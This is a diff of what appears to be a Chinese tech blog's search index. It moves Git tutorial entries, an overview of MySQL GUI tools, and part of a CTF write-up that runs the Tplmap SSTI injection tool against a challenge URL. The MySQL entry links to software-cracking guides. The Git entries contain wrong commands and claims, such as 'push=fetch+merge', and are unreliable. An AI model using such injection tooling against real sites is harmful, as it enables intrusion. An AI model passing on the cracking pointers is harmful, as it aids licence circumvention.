+]]></content>
+      <tags>
+        <tag>SQL</tag>
       </tags>
   </entry>
   <entry>
@@ -865,235 +970,6 @@
 ]]></content>
       <tags>
         <tag>C++</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Git版本穿梭及版本比较</title>
-    <url>/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/</url>
-    <content><![CDATA[<h1 id="上节内容命令小结"><a href="#上节内容命令小结" class="headerlink" title="上节内容命令小结"></a>上节内容命令小结</h1><ul>
-<li><p>状态查看：<code>git status</code></p>
-</li>
-<li><p>添加操作：<code>git add 文件名.扩展名</code>（将工作区文件添加到暂存区）</p>
-</li>
-<li><p>提交操作：<code>git commit -m &quot;备注&quot; 文件名.扩展名</code>（将暂存区文件提交到本地库）</p>
-<span id="more"></span></li>
-</ul>
-<h1 id="查看历史记录"><a href="#查看历史记录" class="headerlink" title="查看历史记录"></a>查看历史记录</h1><p>查看历史版本：<code>git log</code></p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109094308532.png" alt="image-20220109094308532"></p>
-<p>简洁显示：<code>git log --pretty=oneline</code></p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109094600500.png" alt="image-20220109094600500"></p>
-<p>更简洁显示：<code>git log --oneline</code>（只显示后面版本）</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109094753040.png" alt="image-20220109094753040"></p>
-<p>显示指针移动步数：<code>git reflog</code>更加详细的历史记录</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109095213452.png" alt="image-20220109095213452"></p>
-<p>HEAD@{移动到当前版本所需要步数}</p>
-<p>若版本信息有多屏</p>
-<p>则空格向下翻页，b向上翻页，q退出</p>
-<h1 id="版本前进后退"><a href="#版本前进后退" class="headerlink" title="版本前进后退"></a>版本前进后退</h1><h2 id="基于索引值操作-推荐"><a href="#基于索引值操作-推荐" class="headerlink" title="基于索引值操作[推荐]"></a>基于索引值操作[推荐]</h2><p>命令：<code>git reset ---hard 开头哈希值（索引值）</code></p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109100709122.png" alt="image-20220109100709122"></p>
-<p>选中了即复制了，直接右键Paste粘贴即可，前进后退都一样</p>
-<h2 id="使用-或-符号"><a href="#使用-或-符号" class="headerlink" title="使用^或~符号"></a>使用^或~符号</h2><p>只能往后退，不能往前</p>
-<p>命令：<code>git reset --hard HEAD^</code>（退一个版本）  <code>git reset --HEAD^^</code>（向后退两个版本）</p>
-<p>有几个”^“就退几个版本，或者<code>git reset --hard HEAD~n</code>后退n步</p>
-<h2 id="soft、mixed、hard参数的区别"><a href="#soft、mixed、hard参数的区别" class="headerlink" title="soft、mixed、hard参数的区别"></a>soft、mixed、hard参数的区别</h2><p>soft参数（不常用）：仅仅移动本地库指针（不改变本地库数据）</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111029305.png" alt="image-20220110111029305"></p>
-<p>mixed参数（不常用）：在本地库移动指针并且重置暂存区</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111040189.png" alt="image-20220110111040189"></p>
-<p>hard参数：在本地库移动指针、重置暂存区、重置工作区</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111056667.png" alt="image-20220110111056667"></p>
-<h1 id="永久删除文件后找回"><a href="#永久删除文件后找回" class="headerlink" title="永久删除文件后找回"></a>永久删除文件后找回</h1><p>创建一个新文件</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111643932.png" alt="image-20220110111643932"></p>
-<p>删除文件指令：<code>rm 文件名.扩展名</code></p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111832475.png" alt="image-20220110111832475"></p>
-<p>现在状态为</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111909833.png" alt="image-20220110111909833"></p>
-<p>若想要恢复，即输入 <code>git add delete.txt</code>和<code>git commit -m &quot;备注&quot; delete.txt</code>来确定删除</p>
-<p>记录不可磨灭（除非删除本地库），所以可根据记录找回删除文件</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110113009537.png" alt="image-20220110113009537"></p>
-<h1 id="添加到暂存区的删除文件找回"><a href="#添加到暂存区的删除文件找回" class="headerlink" title="添加到暂存区的删除文件找回"></a>添加到暂存区的删除文件找回</h1><p>新建文件，并提交到本地库</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110113802079.png" alt="image-20220110113802079"></p>
-<p>然后删除文件，并添加到暂存区</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110113841345.png" alt="image-20220110113841345"></p>
-<p>若要找回此文件，则输入指令：<code>git reset --hard HEAD</code>(本质仍然是版本回归)</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110114018441.png" alt="image-20220110114018441"></p>
-<p><strong><u>总结：删除文件找回的前提是，删除前文件存在时的状态提交到了本地库</u></strong></p>
-<h1 id="文件比较"><a href="#文件比较" class="headerlink" title="文件比较"></a>文件比较</h1><p>命令：<code>git diff 文件名.拓展名</code></p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110191213839.png" alt="image-20220110191213839"></p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110191331518.png" alt="image-20220110191331518"></p>
-<p>上图表示第一行删去了9个a</p>
-<p>还有其他比较方式，和本地库比较：<code>git diff HEAD 文件名</code>、和历史版本比较：<code>git diff HEAD^ 文件名</code>（和上一版本比较）</p>
-]]></content>
-      <tags>
-        <tag>Git</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Git的分支管理级Git的基本原理</title>
-    <url>/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/</url>
-    <content><![CDATA[<h1 id="分支的意义"><a href="#分支的意义" class="headerlink" title="分支的意义"></a>分支的意义</h1><ul>
-<li><p>分支是主干（master）的复制品，可以进行试错，可以删除，也也可以合并回主干</p>
-</li>
-<li><p>分支更加专业化，分支之间互不干扰</p>
-</li>
-<li><p>可以多人同时开发不同分支，增加开发效率</p>
-<span id="more"></span></li>
-</ul>
-<h1 id="分支操作"><a href="#分支操作" class="headerlink" title="分支操作"></a>分支操作</h1><p>查看所有分支命令：<code>git branch -v</code></p>
-<p>创建新的分支：<code>git branch 分支名</code></p>
-<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220110195627374.png" alt="image-20220110195627374"></p>
-<p>分支的切换：<code>git checkout 分支名</code></p>
-<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220110195754653.png" alt="image-20220110195754653"></p>
-<p>用hot_fix分支修改文件</p>
-<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220110200141530.png" alt="image-20220110200141530"></p>
-<p>若要将hot_fix分支合并到master分支上，则要切换到master分支上（即被合并的分支）</p>
-<p>合并命令：<code>git merge 分支名</code></p>
-<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220110200612093.png" alt="image-20220110200612093"></p>
-<p>当分支有冲突时（即两个分支都对同一地方进行了修改）</p>
-<p>首先要产生冲突</p>
-<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220110201910358.png" alt="image-20220110201910358"></p>
-<p>产生冲突后看产生冲突的文件内容</p>
-<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220110202059391.png" alt="image-20220110202059391"></p>
-<p>删除多于内容后（可在阅览模式下双击d键删除一行）</p>
-<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220110202632027.png" alt="image-20220110202632027"></p>
-<p>保留自己想要的内容，然后<code>git add 文件名</code>，<code>git commit -m &quot;备注&quot;</code>提交</p>
-<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220110203321229.png" alt="image-20220110203321229"></p>
-<h1 id="Git基本原理"><a href="#Git基本原理" class="headerlink" title="Git基本原理"></a>Git基本原理</h1><h2 id="哈希算法"><a href="#哈希算法" class="headerlink" title="哈希算法"></a>哈希算法</h2><p>哈希是一个系列的加密算法，各个不同的哈希加密虽然加密强度不同，但是有以下几个共同点</p>
-<ul>
-<li>不管输入的数据量有多大，输入同一个哈希算法，得到的加密结果长度固定。</li>
-<li>哈希加密确定，输入数据有变化，输出数据一定有变化，而且变化程度很大。</li>
-<li>哈希算法确定，输入数据确定，输出数据能够保证不变。</li>
-<li>哈希算法不可逆</li>
-</ul>
-<p>Git底层采用的是SHA-1算法。</p>
-<p>哈希算法可以被用来验证文件。原理如下</p>
-<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220111095840028.png" alt="image-20220111095840028"></p>
-<p>Git就是靠这种操作从根本上保证数据的完整性。</p>
-<h2 id="Git保存版本机制"><a href="#Git保存版本机制" class="headerlink" title="Git保存版本机制"></a>Git保存版本机制</h2><p>首先讲一下集中式版本控制工具的文件管理机制</p>
-<p>以文件变更列表的方式存储信息。这类系统将它们保存的信息看作时一组基本文件和每个文件随时间逐步积累的差异。也就是只保存更改的地方</p>
-<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220111101222004.png" alt="image-20220111101222004"></p>
-<p>然后是Git的文件管理机制</p>
-<p>Git把数据看作是小型文件系统的一组快照，每次提交更新时，Git都会对当前的全部文件制作一个快照并保存这个快照的索引。为了高效，<u>如果文件没有修改，Git不再重新存储该文件</u>。所以Git的工作方式可以称之为快照流。</p>
-<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220111103051918.png" alt="image-20220111103051918"></p>
-<p>Git的提交对象</p>
-<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220111103632587.png" alt="image-20220111103632587"></p>
-<p>提交对象及其父对象形成的链条</p>
-<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220111103823481.png" alt="image-20220111103823481"></p>
-<h2 id="Git分支管理机制"><a href="#Git分支管理机制" class="headerlink" title="Git分支管理机制"></a>Git分支管理机制</h2><p>分支的创建</p>
-<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220111104023440.png" alt="image-20220111104023440"></p>
-<p>testing指针和master指针在同一链条，而不是为testing单搞一条链，节省了储存空间</p>
-<p>分支切换（改变HEAD指针的位置）</p>
-<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220111121831087.png" alt="image-20220111121831087"></p>
-<p>当分支文件不一样时，才会出现分支</p>
-<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220111122101487.png" alt="image-20220111122101487"></p>
-<p><strong>Git在本地的版本控制就完结了</strong></p>
-]]></content>
-      <tags>
-        <tag>Git</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Git远程库相关操作</title>
-    <url>/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/</url>
-    <content><![CDATA[<h1 id="添加远程库及推送"><a href="#添加远程库及推送" class="headerlink" title="添加远程库及推送"></a>添加远程库及推送</h1><p>命令：<code>git remote add 地址名 HTTP或SSH地址</code></p>
-<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111201215014.png" alt="image-20220111201215014"></p>
-<p>执行完后，如以下页面</p>
-<span id="more"></span>
-
-<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111201612020.png" alt="image-20220111201612020"></p>
-<p>推送命令：<code>git push 地址名 分支名</code>，执行后报错</p>
-<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111202306396.png" alt="image-20220111202306396"></p>
-<p>因为git在拉取或者提交项目时，中间会有git的http和https代理，但是我们本地环境本身就有SSL协议了，所以取消git的https代理即可，不行再取消http的代理。</p>
-<p>取消指令为：</p>
-<p>取消http代理<br><code>git config --global --unset http.proxy</code><br>取消https代理<br><code>git config --global --unset https.proxy</code></p>
-<p>也可以直接用ssh地址，设置ssh协议的方法可参考<a href="https://zhuanlan.zhihu.com/p/103391101">这里</a></p>
-<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111202436988.png" alt="image-20220111202436988"></p>
-<p>然后查看远程库，即可发现文件</p>
-<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111202501488.png" alt="image-20220111202501488"></p>
-<h1 id="克隆远程库到本地"><a href="#克隆远程库到本地" class="headerlink" title="克隆远程库到本地"></a>克隆远程库到本地</h1><p>命令：<code>git clone 克隆地址</code>，克隆地址为下（克隆不需要再初始化）</p>
-<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111203222264.png" alt="image-20220111203222264"></p>
-<p>操作如下</p>
-<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111203419197.png" alt="image-20220111203419197"></p>
-<p>克隆的三个操作</p>
-<ul>
-<li>完整的把远程库下载到本地</li>
-<li>创建origin远程库地址别名</li>
-<li>初始化本地库</li>
-</ul>
-<h2 id="推送本地库到远程库"><a href="#推送本地库到远程库" class="headerlink" title="推送本地库到远程库"></a>推送本地库到远程库</h2><p>命令：<code>git push 远程库地址别名 分支名</code>（前提是，发出提交的Github账户在该团队内，邀请在GitHub内进行）</p>
-<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111212540339.png" alt="image-20220111212540339"></p>
-<p>邀请加入后</p>
-<p>这里仍然要用ssh协议</p>
-<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111210851950.png" alt="image-20220111210851950"></p>
-<p>内容推送上去后，远程库内容改变</p>
-<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111211327947.png" alt="image-20220111211327947"></p>
-<h1 id="拉取远程库到本地库"><a href="#拉取远程库到本地库" class="headerlink" title="拉取远程库到本地库"></a>拉取远程库到本地库</h1><p>然后切换另一编辑者，也就是库的创建者</p>
-<p>执行抓取操作：<code>git fetch 地址别名 分支</code></p>
-<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111211608126.png" alt="image-20220111211608126"></p>
-<p>抓取下来后可看到，本地库文件并没有改变</p>
-<p>切换分支：<code>git checkout 地址别名/分支名</code></p>
-<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111211801979.png" alt="image-20220111211801979"></p>
-<p>可看到，内容已经改变（多了一行g）</p>
-<p>然后要将远程库合并到本地库就要切换到master分支，然后执行：<code>git merge 地址别名/分支名</code></p>
-<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111220729815.png" alt="image-20220111220729815"></p>
-<p>以上适用于需要检查代码的情况，比较麻烦</p>
-<p>若是追求简单，则可直接执行：<code>git pull 地址别名 分支名</code>同样可拿到远程库内容</p>
-<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111220915812.png" alt="image-20220111220915812"></p>
-<p><strong><u>总结：push=fetch+merge</u></strong></p>
-<h1 id="推送时的矛盾"><a href="#推送时的矛盾" class="headerlink" title="推送时的矛盾"></a>推送时的矛盾</h1><p>若两个人同时对远程库进行推送，则推送晚者不能推送，只能拉取最新的库，然后再进行修改、推送</p>
-<p>冲突页面如下</p>
-<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111221428737.png" alt="image-20220111221428737"></p>
-<p>拉取远程库文件</p>
-<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111221617497.png" alt="image-20220111221617497"></p>
-<p>打开冲突的文件</p>
-<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111221505181.png" alt="image-20220111221505181"></p>
-<p>删去多余行目，然后提交到本地库</p>
-<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111221923785.png" alt="image-20220111221923785"></p>
-<p>然后再推送到远程库</p>
-<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111222029729.png" alt="image-20220111222029729"></p>
-<p><strong>这种机制的目的避免了推送混乱</strong></p>
-]]></content>
-      <tags>
-        <tag>Git</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>MySQL常用的图形管理工具</title>
-    <url>/2022/01/13/MySQL%E5%B8%B8%E7%94%A8%E7%9A%84%E5%9B%BE%E5%BD%A2%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/</url>
-    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>日常开发中，如果在类似dos窗口中进行，对于初学者来说，上手难度高，也显得枯燥乏味，所以我们用MySQL图形管理工具来连接MySQL，然后在图形化界面上操作。</p>
-<p>MySQL的管理维护工具非常多，除了系统自带的命令行管理工具外，还有许多其他的图形管理工具。</p>
-<p><img src="/2022/01/13/MySQL%E5%B8%B8%E7%94%A8%E7%9A%84%E5%9B%BE%E5%BD%A2%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/image-20220113170325596.png" alt="image-20220113170325596"></p>
-<h1 id="常用工具介绍"><a href="#常用工具介绍" class="headerlink" title="常用工具介绍"></a>常用工具介绍</h1><h2 id="Navicat（第一批队）"><a href="#Navicat（第一批队）" class="headerlink" title="Navicat（第一批队）"></a>Navicat（第一批队）</h2><p>Navicat是一套快速、可靠的数据库管理工具，Navicat是以直觉化的图形用户界面而建的，可以兼容多种昂数据库，支持多种操作系统。</p>
-<span id="more"></span>
-
-<h2 id="SQLyog（第一批队）"><a href="#SQLyog（第一批队）" class="headerlink" title="SQLyog（第一批队）"></a>SQLyog（第一批队）</h2><p>SQLyog是一个快速而简洁的图形化管理MySQL数据库工具，他能后在任何地方有效管理你的数据库，由业界著名的Webyog公司出品</p>
-<p>使用SQLyog可以快速直观地让您从世界的任何角落通过网络来维护远端的MySQL数据库</p>
-<h2 id="MySQL-Workbench（第一批队）"><a href="#MySQL-Workbench（第一批队）" class="headerlink" title="MySQL Workbench（第一批队）"></a>MySQL Workbench（第一批队）</h2><p>MySQL Workbench是MySQL官方提供的图形化管理工具，分为社区版和商业版，社区版完全免费，而商业版则是按年收费。支持数据库的创建、设计、迁移、备份、到处和导入等功能，并且支持Windows、Linux和mac等主流的操作系统</p>
-<h2 id="DataGrip（第二批队）"><a href="#DataGrip（第二批队）" class="headerlink" title="DataGrip（第二批队）"></a>DataGrip（第二批队）</h2><p>DataGrip是大名鼎鼎的JetBrains公司出品的，就是那个出品Intellij IDEA的公司。</p>
-<p>DataGrip是一款数据库管理客户端工具，方便连接到数据库服务，执行sql、创建表、创建索引以及导出数据等。</p>
-<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul>
-<li>phpMyAdmin</li>
-<li>MySQLDumper</li>
-<li>MySQL GUI Tools（官网提供）</li>
-<li>MySQL ODBS Connector</li>
-</ul>
-<h1 id="图形管理工具安装"><a href="#图形管理工具安装" class="headerlink" title="图形管理工具安装"></a>图形管理工具安装</h1><h2 id="Navicat的安装"><a href="#Navicat的安装" class="headerlink" title="Navicat的安装"></a>Navicat的安装</h2><p>去<a href="https://navicat.com.cn/products">官网</a>下载安装包（<a href="https://cloud.tencent.com/developer/article/1804255">白嫖请参考</a>）并安装</p>
-<p><img src="/2022/01/13/MySQL%E5%B8%B8%E7%94%A8%E7%9A%84%E5%9B%BE%E5%BD%A2%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/image-20220113173117017.png" alt="image-20220113173117017"></p>
-<p>安装完成后</p>
-<p><img src="/2022/01/13/MySQL%E5%B8%B8%E7%94%A8%E7%9A%84%E5%9B%BE%E5%BD%A2%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/image-20220113174323767.png" alt="image-20220113174323767"></p>
-<h2 id="SQLyog的安装"><a href="#SQLyog的安装" class="headerlink" title="SQLyog的安装"></a>SQLyog的安装</h2><p><a href="https://sqlyog.softonic.nl/">点击此处</a>下载安装包，下载完成后安装（<a href="https://www.cnblogs.com/pengpengdeyuan/p/14364777.html">白嫖参考</a>也可以下载<a href="https://github.com/webyog/sqlyog-community/wiki/Downloads">社区版</a>）</p>
-<p><img src="/2022/01/13/MySQL%E5%B8%B8%E7%94%A8%E7%9A%84%E5%9B%BE%E5%BD%A2%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/image-20220113175137345.png" alt="image-20220113175137345"></p>
-<p>一直点下一步即可</p>
-<p><img src="/2022/01/13/MySQL%E5%B8%B8%E7%94%A8%E7%9A%84%E5%9B%BE%E5%BD%A2%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/image-20220113184750571.png" alt="image-20220113184750571"></p>
-<h1 id="图形化管理工具连接MySQL"><a href="#图形化管理工具连接MySQL" class="headerlink" title="图形化管理工具连接MySQL"></a>图形化管理工具连接MySQL</h1><h2 id="Navicat连接"><a href="#Navicat连接" class="headerlink" title="Navicat连接"></a>Navicat连接</h2><p><img src="/2022/01/13/MySQL%E5%B8%B8%E7%94%A8%E7%9A%84%E5%9B%BE%E5%BD%A2%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/image-20220113190355479.png" alt="image-20220113190355479"></p>
-<p>注意：此时主机连接的是本地地址，若是远程的要输入对应ip</p>
-<p>连接成功后</p>
-<p><img src="/2022/01/13/MySQL%E5%B8%B8%E7%94%A8%E7%9A%84%E5%9B%BE%E5%BD%A2%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/image-20220113190605114.png" alt="image-20220113190605114"></p>
-<h2 id="SQLyog连接"><a href="#SQLyog连接" class="headerlink" title="SQLyog连接"></a>SQLyog连接</h2><p><img src="/2022/01/13/MySQL%E5%B8%B8%E7%94%A8%E7%9A%84%E5%9B%BE%E5%BD%A2%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/image-20220113191121646.png" alt="image-20220113191121646"></p>
-<p>点击是，连接成功</p>
-<p><img src="/2022/01/13/MySQL%E5%B8%B8%E7%94%A8%E7%9A%84%E5%9B%BE%E5%BD%A2%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/image-20220113191138375.png" alt="image-20220113191138375"></p>
-]]></content>
-      <tags>
-        <tag>SQL</tag>
       </tags>
   </entry>
   <entry>
@@ -1741,6 +1617,8 @@
     <url>/2022/04/07/Tplmap%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
     <content><![CDATA[<h1 id="什么是Tplmap？"><a href="#什么是Tplmap？" class="headerlink" title="什么是Tplmap？"></a>什么是Tplmap？</h1><p>Tplmap是一种SSTI注入工具，类似于与sqlmap，只不过sqlmap适用于sql注入，而tplmap适用于ssti注入</p>
 <h1 id="什么是SSTI？"><a href="#什么是SSTI？" class="headerlink" title="什么是SSTI？"></a>什么是SSTI？</h1><p>这里引用一下大佬的博客，<a href="https://www.jianshu.com/p/b6f1aea3a2eb">点这里</a>。</p>
+<span id="more"></span>
+
 <h1 id="安装Tplmap"><a href="#安装Tplmap" class="headerlink" title="安装Tplmap"></a>安装Tplmap</h1><p><a href="https://blog.csdn.net/weixin_47726676/article/details/115905366">点这里</a>，这里用的是python2，而kali自带的是python3，我试了一下，也可以，只不过这里命令要换成<code>python3 tplmap.py -u &quot;URL/?flag=1&quot;</code>，这里的变量名称不一定是flag，根据题目而定，但是一定要输入变量名。</p>
 <p><a href="https://blog.csdn.net/smli_ng/article/details/106026901">详细使用方法</a></p>
 <h1 id="实战例题"><a href="#实战例题" class="headerlink" title="实战例题"></a>实战例题</h1><p>我用的是最菜的Simple_SSTI_2，首先题目便提示了我们变量名称为flag，所以我们直接执行</p>
@@ -1755,6 +1633,66 @@
 ]]></content>
       <tags>
         <tag>SSTI</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Git版本穿梭及版本比较</title>
+    <url>/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/</url>
+    <content><![CDATA[<h1 id="上节内容命令小结"><a href="#上节内容命令小结" class="headerlink" title="上节内容命令小结"></a>上节内容命令小结</h1><ul>
+<li><p>状态查看：<code>git status</code></p>
+</li>
+<li><p>添加操作：<code>git add 文件名.扩展名</code>（将工作区文件添加到暂存区）</p>
+</li>
+<li><p>提交操作：<code>git commit -m &quot;备注&quot; 文件名.扩展名</code>（将暂存区文件提交到本地库）</p>
+<span id="more"></span></li>
+</ul>
+<h1 id="查看历史记录"><a href="#查看历史记录" class="headerlink" title="查看历史记录"></a>查看历史记录</h1><p>查看历史版本：<code>git log</code></p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109094308532.png" alt="image-20220109094308532"></p>
+<p>简洁显示：<code>git log --pretty=oneline</code></p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109094600500.png" alt="image-20220109094600500"></p>
+<p>更简洁显示：<code>git log --oneline</code>（只显示后面版本）</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109094753040.png" alt="image-20220109094753040"></p>
+<p>显示指针移动步数：<code>git reflog</code>更加详细的历史记录</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109095213452.png" alt="image-20220109095213452"></p>
+<p>HEAD@{移动到当前版本所需要步数}</p>
+<p>若版本信息有多屏</p>
+<p>则空格向下翻页，b向上翻页，q退出</p>
+<h1 id="版本前进后退"><a href="#版本前进后退" class="headerlink" title="版本前进后退"></a>版本前进后退</h1><h2 id="基于索引值操作-推荐"><a href="#基于索引值操作-推荐" class="headerlink" title="基于索引值操作[推荐]"></a>基于索引值操作[推荐]</h2><p>命令：<code>git reset ---hard 开头哈希值（索引值）</code></p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109100709122.png" alt="image-20220109100709122"></p>
+<p>选中了即复制了，直接右键Paste粘贴即可，前进后退都一样</p>
+<h2 id="使用-或-符号"><a href="#使用-或-符号" class="headerlink" title="使用^或~符号"></a>使用^或~符号</h2><p>只能往后退，不能往前</p>
+<p>命令：<code>git reset --hard HEAD^</code>（退一个版本）  <code>git reset --HEAD^^</code>（向后退两个版本）</p>
+<p>有几个”^“就退几个版本，或者<code>git reset --hard HEAD~n</code>后退n步</p>
